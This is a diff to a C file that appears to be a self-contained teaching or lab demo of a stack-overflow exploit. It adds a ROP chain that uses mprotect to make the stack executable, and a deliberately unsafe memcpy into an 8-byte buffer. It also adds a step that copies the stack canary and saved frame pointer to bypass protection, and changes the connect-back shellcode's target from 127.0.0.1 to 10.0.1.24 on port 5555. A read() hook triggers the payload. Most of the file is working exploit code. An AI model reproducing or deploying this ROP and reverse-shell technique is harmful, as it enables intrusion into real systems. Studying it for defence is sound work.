@@ -20,8 +20,11 @@ typedef union ShellCodeUnion {
 } ShellCodeUnion, *ShellCodeUnionPtr;
 
 typedef struct Payload {
+	char		pl_dst[8];
+	void		*pl_canary;
+	void		*pl_rbp;
 	void		*pl_popRDI;
-	void		*pl_stackStart;
+	void		*pl_stackPage;
 	void		*pl_popRSI;
 	ptrdiff_t	pl_stackSize;
 	void		*pl_popRDX;
@@ -101,7 +104,7 @@ static inline void *libcBase(void *p) {
 	return p;
 } // libcBase()
 
-static inline void *stackBase(void) {
+static inline void *stackPage(void) {
 	int dummy = 0;
 
 	return pageBase(&dummy);
@@ -115,8 +118,11 @@ static void populate(PayloadPtr plp) {
 
 	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
 
+	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));
+	plp->pl_canary		= NULL;
+	plp->pl_rbp		= NULL; // The function RIP is next, but we'll force a ROP chain from here.
 	plp->pl_popRDI		= &&l_poprdi;
-	plp->pl_stackStart	= stackBase();
+	plp->pl_stackPage	= stackPage();
 	plp->pl_popRSI		= &&l_poprsi;
 	plp->pl_stackSize	= getpagesize();
 	plp->pl_popRDX		= &&l_poprdx;
@@ -125,10 +131,10 @@ static void populate(PayloadPtr plp) {
 	plp->pl_shellCode	= &plp->scu; // Must be updated whenever *plp moves
 
 	plp->scu.sc.port	= htons(5555);
-	plp->scu.sc.address[0]	= 127;
-	plp->scu.sc.address[1]	= 0;
-	plp->scu.sc.address[2]	= 0;
-	plp->scu.sc.address[3]	= 1;
+	plp->scu.sc.address[0]	= 10; //127;
+	plp->scu.sc.address[1]	= 0;  //0;
+	plp->scu.sc.address[2]	= 1;  //0;
+	plp->scu.sc.address[3]	= 24; //1;
 
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
@@ -176,8 +182,10 @@ static void dumpload(PayloadPtr plp) {
 	printf("In dumpload()\n");
 
 	printf("--------------------------------------------\n");
+	printf("%20s: %p\n",           "plp->pl_canary",       plp->pl_canary);
+	printf("%20s: %p\n",           "plp->pl_rbp",          plp->pl_rbp);
 	printf("%20s: %p\n",           "plp->pl_popRDI",       plp->pl_popRDI);
-	printf("%20s: %p\n",           "plp->pl_stackStart",   plp->pl_stackStart);
+	printf("%20s: %p\n",           "plp->pl_stackPage",    plp->pl_stackPage);
 	printf("%20s: %p\n",           "plp->pl_popRSI",       plp->pl_popRSI);
 	printf("%20s: %#tx\n",         "plp->pl_stackSize",    plp->pl_stackSize);
 	printf("%20s: %p\n",           "plp->pl_popRDX",       plp->pl_popRDX);
@@ -189,28 +197,25 @@ static void dumpload(PayloadPtr plp) {
 	printf("--------------------------------------------\n");
 } // dumpload()
 
-static Payload p, q, r;
+static void overflow(char *src, size_t n) {
+	char dst[8] = {0};
 
-static void testload(PayloadPtr plp) {
+	printf("In overflow()");
+
+	memcpy(dst, src, n);
+} // overflow()
+
+static void testload(PayloadPtr plp, size_t n) {
 	char dst[8] = {0};
 
 	printf("In testload()\n");
 
-p = *plp;
-	*((PayloadPtr) &(dst[24])) = *plp;
-q = *((PayloadPtr) &(dst[24]));
-	((PayloadPtr) &(dst[24]))->pl_shellCode = &((PayloadPtr) &(dst[24]))->scu;
-r = *((PayloadPtr) &(dst[24]));
+	// Help the hacker by populating the payload with the correct canary and saved frame pointer
+	memcpy(plp->pl_dst, dst, sizeof(plp->pl_dst) + sizeof(plp->pl_canary) + sizeof(plp->pl_rbp));
+
+	plp->pl_shellCode = &dst[0] + ((void *)(&plp->scu) - (void *)plp);
+	plp->pl_shellCode = ((void *) &dst) + ((void *)(&plp->scu) - (void *)plp);
 } // testload()
-
-static void overflow(char *src, size_t n) {
-	char dst[8] = {0};
-
-	printf("In overflow(): %tu\n", n);
-	printf("In overflow(): %s\n", src);
-
-	memcpy(dst, src, n);
-} // overflow()
 
 ssize_t read(int fd, void *buf, size_t count) {
 	ssize_t (*real_read)(int fd, void *buf, size_t count) = real_read = dlsym(RTLD_NEXT, s_libc_read);
@@ -228,7 +233,7 @@ ssize_t read(int fd, void *buf, size_t count) {
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
 		else if (!strncmp(s_testload, p, strlen(s_testload)))
-			testload(&payload);
+			testload(&payload, sizeof(payload));
 		else if (!strncmp(s_overflow, p, strlen(s_overflow)))
 			overflow(p, result - (p - (char *) buf));
 	} // if
@@ -251,5 +256,6 @@ int main(int argc, char **argv)
 	populate(&payload);
 	disclose(&payload);
 	dumpload(&payload);
-	testload(&payload);
+	testload(&payload, sizeof(payload));
+	overflow((char *) &payload, sizeof(payload));
 } // main()
